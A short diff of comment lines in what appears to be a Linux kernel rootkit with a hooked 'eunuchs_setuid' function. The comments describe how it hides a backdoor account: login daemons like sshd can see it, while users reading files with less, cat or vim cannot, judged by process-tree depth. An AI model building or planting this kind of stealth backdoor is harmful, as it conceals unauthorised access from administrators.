@@ -370,7 +370,7 @@ static asmlinkage long eunuchs_setuid(uid_t uid)
  *
  * If it's a process, we then need to see if it's a login-type process (login,
  * systemd-logind, gdm, etc) which *SHOULD* have visibility to our account (or
- * else having that account is useless), or some other command (vim, more, less,
+ * else having that account is useless), or some other command (vim, less,
  * cat, nano, etc). We can determine this by noting that the latter type of
  * commands have a parent process which is (probably) a shell or terminal, while
  * the former should be daemons which have a parent process of systemd (init).
@@ -388,8 +388,8 @@ static asmlinkage long eunuchs_setuid(uid_t uid)
  * strip out the contents, so that we may login to ssh.
  *
  * Conversely, most users attemping to read the file by
- * more/less/cat/vim/nano/etc will have a process hierarchy that looks like
- *    systemd -> systemd-user -> gnome-terminal -> zsh -> more
+ * less/cat/vim/nano/etc will have a process hierarchy that looks like
+ *    systemd -> systemd-user -> gnome-terminal -> zsh -> less
  * all of which belong to different process groups. Since the amount of
  * traversals to get to init (pid 1) here is higher than we set our threshold,
  * we should strip this out so that it's not visible.
